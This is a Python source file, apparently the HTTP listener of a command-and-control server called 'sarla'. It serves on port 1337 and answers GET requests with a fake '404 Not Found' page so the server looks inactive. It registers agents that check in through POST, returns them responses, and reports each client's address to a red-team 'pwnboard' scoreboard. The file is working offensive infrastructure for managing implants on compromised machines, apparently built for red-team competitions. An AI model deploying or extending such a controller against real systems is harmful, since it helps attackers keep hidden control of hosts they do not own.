import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from sarla.server.src.handler import process_agent
from sarla.server.src.utils.tables import create_table
from sarla.server.src.utils import settings
from sarla.server.src.utils import pwnboard

host = "0.0.0.0"
port = 1337
settings.agent_dict = dict()


class requests(BaseHTTPRequestHandler):

    def _set_headers(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

    def _html(self, message):
        content = f"{message}"
        return content.encode("utf8")

    def do_GET(self):
        self._set_headers()
        self.wfile.write(self._html("404 Not Found"))

    def do_POST(self):
        # Update pwnboard
        pwnboard.update_pwnboard(self.client_address)

        postData = ((self.rfile.read(int(self.headers["content-length"]))
                     ).decode("utf-8")).rstrip("\r\n\r\n\0")
        cookie = process_agent(postData, settings.agent_dict)
        create_table(settings.agent_dict)
        print("\nResponse sent to agent: ", cookie)
        self._set_headers()
        self.wfile.write(self._html(cookie))


def server():
    server = HTTPServer((host, port), requests)
    thread = threading.Thread(None, server.serve_forever)
    thread.daemon = True
    thread.start()
